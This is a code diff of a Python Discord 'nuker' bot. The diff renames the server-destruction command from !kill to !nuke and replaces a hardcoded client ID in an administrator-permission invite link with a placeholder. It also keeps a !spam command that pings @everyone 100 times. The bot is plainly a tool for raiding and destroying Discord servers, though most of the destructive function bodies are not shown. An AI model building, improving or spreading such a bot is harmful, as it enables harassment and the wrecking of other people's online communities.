@@ -68,7 +68,7 @@ async def on_ready():
 @client.command()
 async def help(ctx):
     await ctx.message.delete()
-    await ctx.send("\nCommands:\n!kill - destroy the server\n!spam [channel] - Spams `@everyone` ping 100 times\n!members - Displays member count\n")
+    await ctx.send("\nCommands:\n!nuke - nuke the server\n!spam [channel] - Spams `@everyone` ping 100 times\n!members - Displays member count\n")
 
 
 ################ KLLORE ON TOP ################
@@ -99,7 +99,7 @@ async def createchannel(ctx,name):
 
 
 @client.command()
-async def kill(ctx):
+async def nuke(ctx):
     guild = ctx.guild
     
     if guild.id in protected_servers:
@@ -189,8 +189,8 @@ async def invite(ctx):
         )
         
 
-        embed_dm.add_field(name="invite link", value="https://discord.com/api/oauth2/authorize?client_id=1152319789243580526&permissions=8&scope=bot")
-        embed_dm.add_field(name="commands:", value="!kill, !spam")
+        embed_dm.add_field(name="invite link", value="https://discord.com/api/oauth2/authorize?client_id={CLIENTID}&permissions=8&scope=bot")
+        embed_dm.add_field(name="commands:", value="!nuke, !spam")
         
 
         await ctx.author.send(embed=embed_dm)
